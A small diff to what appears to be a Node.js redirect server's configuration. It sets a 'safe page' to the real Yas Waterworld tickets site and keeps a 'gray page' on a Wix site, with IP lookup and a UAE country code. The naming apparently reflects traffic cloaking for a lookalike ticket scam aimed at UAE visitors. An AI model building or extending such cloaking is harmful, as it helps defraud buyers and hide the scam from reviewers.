@@ -7,7 +7,7 @@ const requestIp = require("request-ip");
 // --- Configuration ---
 const PORT = process.env.PORT || 10000;
 
-const SAFE_PAGE = process.env.SAFE_PAGE || "https://treesaudia.wixstudio.com/website/blank-4";
+const SAFE_PAGE = process.env.SAFE_PAGE || "https://www.yaswaterworld.com/ar/tickets";
 const GRAY_PAGE = process.env.GRAY_PAGE || "https://treesaudia.wixstudio.com/website";
 
 const UAE_COUNTRY_CODE = "AE";
